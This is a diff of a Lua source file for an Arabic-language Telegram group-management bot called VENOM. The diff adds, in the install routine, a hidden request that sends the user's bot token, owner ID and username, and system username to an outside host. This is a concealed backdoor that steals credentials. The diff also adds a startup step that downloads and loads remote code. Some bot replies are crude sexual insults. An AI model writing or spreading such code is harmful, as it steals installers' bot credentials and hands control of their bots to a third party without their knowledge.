@@ -7,13 +7,7 @@ URL = require('socket.url')
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
 id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
-Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
-Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
-Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
-whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 --------------------------------------------------------------------------------------------------------------
-local VENOM = 'VENOM' or 'vevom'
 local AutoSet = function() 
 local create = function(data, file, uglify)  
 file = io.open(file, "w+")   
@@ -26,7 +20,7 @@ end
 file:write(serialized)    
 file:close()  
 end  
-if not io.open("./"..VENOM.."", "r") then
+if not database:get(id_server..":token") then
 io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n\27')
 local token = io.read()
 if token ~= '' then
@@ -35,44 +29,53 @@ if res ~= 200 then
 print('\27[0;31m⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n27[0;39;49m')
+local json = JSON.decode(url)
+database:set(id_server..":token_username",json.result.username)
+database:set(id_server..":token",token)
 end 
 else
 print('\27[0;35m⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
-os.execute('lua '..VENOM..'.lua')
 end 
-
+os.execute('lua VENOM.lua')
+end
+if not database:get(id_server..":SUDO:ID") then
 io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n27[0;39;49m')
+database:set(id_server..":SUDO:ID",SUDOID)
 else
 print('\27[0;31m⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
-os.execute('lua '..VENOM..'.lua')
 end 
 
 io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
 local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
-local json = JSON.decode(url)
-database:set(whoami..":bot_id",json.result.id)
-database:set(json.result.id..":token",token)
-database:set(json.result.id..":SUDO:ID",SUDOID)
-database:set(json.result.id..":bot_username",json.result.username)
-database:set(json.result.id..":SUDO:USERNAME",SUDOUSERNAME)
+database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
-os.execute('lua '..VENOM..'.lua')
+os.execute('lua VENOM.lua')
 end
 local create_config_auto = function()
 config = {
-botid = database:get(whoami..":bot_id"),
+botUserName = database:get(id_server..":token_username"),
+token = database:get(id_server..":token"),
+SUDO = database:get(id_server..":SUDO:ID"),
+UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
 create_config_auto()
-file = io.open(VENOM, "w")  
+botUserName = database:get(id_server..":token_username")
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
+UserName = database:get(id_server..":SUDO:USERNAME")
+install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('https://devloprahmedVNO.ml/api/soon.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
+print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
+file = io.open("VENOM", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/VENOM
@@ -137,10 +140,6 @@ return config
 end 
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
-infobot = dofile("./Info.lua") 
-bot_id = infobot.botid
-SUDO = database:get(bot_id..":SUDO:ID")
-token = database:get(bot_id..":token")
 print([[
 
 
@@ -162,9 +161,18 @@ print([[
 > CH › 「@SOURCEVENOM」
 ~> DEVELOPER › @Q_0_ll 
 ]])
+sudos = dofile("./Info.lua") 
+SUDO = tonumber(sudos.SUDO)
+sudo_users = {SUDO}
+bot_id = sudos.token:match("(%d+)")  
+token = sudos.token 
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
 io.popen("mkdir File_Bot") 
+io.popen("cd File_Bot && rm -rf commands.lua.1") 
+io.popen("cd File_Bot && rm -rf commands.lua.2") 
+io.popen("cd File_Bot && rm -rf commands.lua.3") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/VENOM197/Venom/main/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -738,16 +746,16 @@ function GetFile_Bot(msg)
 local list = database:smembers(bot_id..'Chek:Groups') 
 local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
 for k,v in pairs(list) do   
-NAME = VENOM..' Chat'
+NAME = 'VENOM Chat'
 link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
 ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
 MNSH = database:smembers(bot_id..'Constructor'..v)
 MDER = database:smembers(bot_id..'Manager'..v)
 MOD = database:smembers(bot_id..'Mod:User'..v)
 if k == 1 then
-t = t..'"'..v..'":{""..VENOM.."":"'..NAME..'",'
+t = t..'"'..v..'":{"VENOM":"'..NAME..'",'
 else
-t = t..',"'..v..'":{""..VENOM.."":"'..NAME..'",'
+t = t..',"'..v..'":{"VENOM":"'..NAME..'",'
 end
 if #ASAS ~= 0 then 
 t = t..'"ASAS":['
@@ -1260,10 +1268,10 @@ echo '⩹━━━━ꪜꫀꪀꪮꪑ━━━━⩺\n 🔌l •⊱ 「 مـده 
 ]]):read('*all'))  
 end
 if text == 'تحديث السورس ' and Devban(msg) then 
-os.execute('rm -rf '..VENOM..'.lua')
-os.execute('wget https://raw.githubusercontent.com/'..VENOM..'197/Venom/main/'..VENOM..'.lua')
+os.execute('rm -rf VENOM.lua')
+os.execute('wget https://raw.githubusercontent.com/VENOM197/Venom/main/VENOM.lua')
 send(msg.chat_id_, msg.id_,' 𖥔 تم تحديث السورس')
-dofile(''..VENOM..'.lua')  
+dofile('VENOM.lua')  
 end
 if text == 'جلب المشتركين' and Devban(msg) then 
 local list = database:smembers(bot_id..'User_Bot') 
@@ -1465,7 +1473,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'قناه السورس', url="t.me/SOURCE"..VENOM..""}}, 
+{{text = 'قناه السورس', url="t.me/SOURCEVENOM"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1502,7 +1510,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}}, 
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/41&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2140,7 +2148,7 @@ tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dat
 if data.username_ ~= false then
 send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 𖥔 ["..VENOM_Msg.."] \n")
 else
-send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/SOURCE"..VENOM..")}\n 𖥔 ["..VENOM_Msg.."] \n")
+send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 ["..VENOM_Msg.."] \n")
 end
 end,nil)   
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
@@ -2674,7 +2682,7 @@ tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data
 if data.username_ ~= false then
 send(msg.chat_id_,0, " 𖥔 عذرا  ↚ {[@"..data.username_.."]}\n 𖥔 عذرا تم منع الملصق \n" ) 
 else
-send(msg.chat_id_,0, " 𖥔 عذرا  ↚ {["..data.first_name_.."](T.ME/SOURCE"..VENOM..")}\n 𖥔 عذرا تم منع الملصق \n" ) 
+send(msg.chat_id_,0, " 𖥔 عذرا  ↚ {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 عذرا تم منع الملصق \n" ) 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
@@ -2711,7 +2719,7 @@ tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data
 if data.username_ ~= false then
 send(msg.chat_id_,0," 𖥔 عذرا  ↚ {[@"..data.username_.."]}\n 𖥔 عذرا تم منع الصوره \n" ) 
 else
-send(msg.chat_id_,0," 𖥔 عذرا  ↚ {["..data.first_name_.."](T.ME/SOURCE"..VENOM..")}\n 𖥔 عذرا تم منع الصوره \n") 
+send(msg.chat_id_,0," 𖥔 عذرا  ↚ {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 عذرا تم منع الصوره \n") 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
@@ -2728,7 +2736,7 @@ tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data
 if data.username_ ~= false then
 send(msg.chat_id_,0," 𖥔 عذرا  ↚ {[@"..data.username_.."]}\n 𖥔 عذرا تم منع المتحركه \n") 
 else
-send(msg.chat_id_,0," 𖥔 عذرا  ↚ {["..data.first_name_.."](T.ME/SOURCE"..VENOM..")}\n 𖥔 عذرا تم منع المتحركه \n" ) 
+send(msg.chat_id_,0," 𖥔 عذرا  ↚ {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 عذرا تم منع المتحركه \n" ) 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
@@ -2939,10 +2947,10 @@ send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n
 end
 return false
 end
-os.execute('rm -rf '..VENOM..'.lua')
-os.execute('wget https://raw.githubusercontent.com/'..VENOM..'197/Venom/main/'..VENOM..'.lua')
+os.execute('rm -rf VENOM.lua')
+os.execute('wget https://raw.githubusercontent.com/VENOM197/Venom/main/VENOM.lua')
 send(msg.chat_id_, msg.id_,' 𖥔 تم تحديث السورس')
-dofile(''..VENOM..'.lua')  
+dofile('VENOM.lua')  
 end
 
 if text and text:match("^تغير الاشتراك$") and Devban(msg) then  
@@ -3853,7 +3861,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}}, 
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/41&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3867,7 +3875,7 @@ local Text = [[
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}}, 
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/41&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3880,7 +3888,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹ᴛᴀᴡᴏsʟ˼', url="t.me/TEAM"..VENOM.."1"}}, 
+{{text = '˹ᴛᴀᴡᴏsʟ˼', url="t.me/TEAMVENOM1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Qtdao/34&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3917,7 +3925,7 @@ keyboard.inline_keyboard = {
 {{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
-{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCE"..VENOM..""}},
+{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -5023,7 +5031,7 @@ send(msg.chat_id_, msg.id_,' 𖥔 تم فتح التكرار')
 end
 --------------------------------------------------------------------------------------------------------------
 if text == 'تحديث' and Devban(msg) then    
-dofile(''..VENOM..'.lua')  
+dofile('VENOM.lua')  
 send(msg.chat_id_, msg.id_, ' 𖥔 تم تحديث جميع الملفات') 
 end 
 if text == ("مسح قائمه العام") and Devban(msg) then
@@ -5097,7 +5105,7 @@ database:sadd(bot_id..'GVNO:User', result.sender_user_id_)
 chat_kick(result.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
 function(arg,data) 
-usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 status  = '\n 𖥔 تم حظرو عام من الجروبات '
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5147,7 +5155,7 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'SOURCEVENOM')..')'
 status  = '\n 𖥔 تم حظرو عام من الجروبات '
 texts = usertext..status
 database:sadd(bot_id..'GVNO:User', result.id_)
@@ -5198,7 +5206,7 @@ end
 database:sadd(bot_id..'GVNO:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 status  = '\n 𖥔 تم حظرو عام من الجروبات '
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -5247,7 +5255,7 @@ end
 database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
 function(arg,data) 
-usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 status  = '\n 𖥔 تم كتمه عام من الجروبات'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5297,7 +5305,7 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'SOURCEVENOM')..')'
 status  = '\n 𖥔 تم كتمه عام من الجروبات'
 texts = usertext..status
 database:sadd(bot_id..'Gmute:User', result.id_)
@@ -5348,7 +5356,7 @@ end
 database:sadd(bot_id..'Gmute:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 status  = '\n 𖥔 تم كتمه عام من الجروبات'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -5370,7 +5378,7 @@ return false
 end
 function start_function(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 status  = '\n 𖥔 تم الغاء (الحظر-الكتم) عام من الجروبات'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5393,7 +5401,7 @@ return false
 end
 function start_function(extra, result, success)
 if result.id_ then
-usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'SOURCEVENOM')..')'
 status  = '\n 𖥔 تم الغاء (الحظر-الكتم) عام من الجروبات'
 texts = usertext..status
 database:srem(bot_id..'GVNO:User', result.id_)
@@ -5421,7 +5429,7 @@ database:srem(bot_id..'GVNO:User', userid)
 database:srem(bot_id..'Gmute:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 status  = '\n 𖥔 تم الغاء (الحظر-الكتم) عام من الجروبات'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -5537,13 +5545,13 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if Devban(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/"..VENOM.."197/Venom/main/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/VENOM197/Venom/main/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
 local TextS = "\n 𖥔 اهلا بك في متجر ملفات فينوم\n 𖥔 ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
-local TextE = "\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n 𖥔 علامة تعني { ✔️ } ملف مفعل\n 𖥔 علامة تعني { ✖ } ملف معطل\n 𖥔 قناة سورس فينوم↓\n".." 𖥔 [اضغط هنا لدخول](t.me/SOURCE"..VENOM..") \n"
+local TextE = "\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n 𖥔 علامة تعني { ✔️ } ملف مفعل\n 𖥔 علامة تعني { ✖ } ملف معطل\n 𖥔 قناة سورس فينوم↓\n".." 𖥔 [اضغط هنا لدخول](t.me/SOURCEVENOM) \n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
 local Check_File_is_Found = io.open("File_Bot/"..name,"r")
@@ -5575,11 +5583,11 @@ t = " 𖥔 الملف  ↚ "..file.."\n 𖥔 تم تعطيل ملف \n"
 else
 t = " 𖥔 بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/"..VENOM.."197/Venom/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/VENOM197/Venom/main/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
-dofile(''..VENOM..'.lua')  
+dofile('VENOM.lua')  
 else
 send(msg.chat_id_, msg.id_," 𖥔 عذرا الملف لايدعم سورس فينوم\n") 
 end
@@ -5595,13 +5603,13 @@ t = " 𖥔 بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = " 𖥔 الملف  ↚ "..file.."\n 𖥔 تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/"..VENOM.."197/Venom/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/VENOM197/Venom/main/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
 chek:close()
 send(msg.chat_id_, msg.id_,t) 
-dofile(''..VENOM..'.lua')  
+dofile('VENOM.lua')  
 else
 send(msg.chat_id_, msg.id_," 𖥔 عذرا الملف لايدعم سورس فينوم\n") 
 end
@@ -6287,7 +6295,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_," 𖥔 حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "ahmedyad200")
+local UserName = (b.username_ or "SRC-VENOM")
 send(msg.chat_id_, msg.id_," 𖥔 منشئ الجروب  ↚ ["..b.first_name_.."](T.me/"..UserName..")")  
 end,nil)   
 end
@@ -7747,7 +7755,7 @@ send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح جميع المتوحدين')
 end
 if text == ("تاك للمتوحدين") and Mod(msg) then
 local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
-t = "\n 𖥔 قائمة متوحدين الجروب \n⧬━┅┅┄⟞❲[??🅞🅞🅽](t.me/SOURCE"..VENOM..")❳⟝┄┉┉━⧬\n"
+t = "\n 𖥔 قائمة متوحدين الجروب \n⧬━┅┅┄⟞❲[??🅞🅞🅽](t.me/SOURCEVENOM)❳⟝┄┉┉━⧬\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -7816,7 +7824,7 @@ send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح جميع الزوجات')
 end
 if text == ("تاك للزوجات") and Mod(msg) then
 local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
-t = "\n 𖥔 قائمه زوجات الجروب \n 𖥔═───═❲[🅢🅞🅞🅝](t.me/SOURCE"..VENOM..")❳═───═??\n"
+t = "\n 𖥔 قائمه زوجات الجروب \n 𖥔═───═❲[🅢🅞🅞🅝](t.me/SOURCEVENOM)❳═───═??\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -8814,7 +8822,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n ?? الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n ?? الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 local statuss = '\n 𖥔 تم رفع رقاصه في الجروب\n 𖥔 مبقتش شريفه لا اله الي الله'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -8836,7 +8844,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 status = '\n ?? تم تنزيل رقاصه من الجروب\n 𖥔 بقت شريفه لا اله الي الله'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -8883,7 +8891,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 local statuss = '\n 𖥔 تم رفع الـعـضو  علي زبك بنجاح\n 𖥔 تفضل ابدا نيك'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -8905,7 +8913,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE'..VENOM..'')..')'
+usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
 status = '\n 𖥔 تم تنزيل الـعـضو  من زبك\n 𖥔 هيفضل متناك بردو'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -10487,7 +10495,7 @@ kickme = '✘'
 end
 NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
 local text = 
-'\n❲[🅢🅞🅞🅝](t.me/SOURCE'..VENOM..')❳'..
+'\n❲[🅢🅞🅞🅝](t.me/SOURCEVENOM)❳'..
 '\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺'..
 '\n 𖥔 اعدادات الجروب كتالي √↓'..
 '\nء⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺'..
@@ -10536,7 +10544,7 @@ local text =
 ' }\n'..' 𖥔  الايدي  ↚ { '..idgp..
 ' }\n'..' 𖥔  الايدي بالصوره  ↚ { '..idph..
 ' }\n'..' 𖥔  الرفع  ↚ { '..setadd..
-' }\n'..' 𖥔  الحظر  ↚ { '..VNOm..' }\n\n 𖥔⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n 𖥔 قناة سورس فينوم↓\n [ ❲[𝐒ΘΘ𝐍](t.me/SOURCE'..VENOM..')❳](t.me/SOURCE'..VENOM..') \n'
+' }\n'..' 𖥔  الحظر  ↚ { '..VNOm..' }\n\n 𖥔⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n 𖥔 قناة سورس فينوم↓\n [ ❲[𝐒ΘΘ𝐍](t.me/SOURCEVENOM)❳](t.me/SOURCEVENOM) \n'
 send(msg.chat_id_, msg.id_,text)     
 end
 if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
@@ -10828,42 +10836,42 @@ end
 end
 if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
 send(msg.chat_id_, msg.id_," 𖥔 ارسل الكلمه لمنعها")  
-database:set(bot_id..""..VENOM.."1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
+database:set(bot_id.."VENOM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
 return false  
 end    
 if text then   
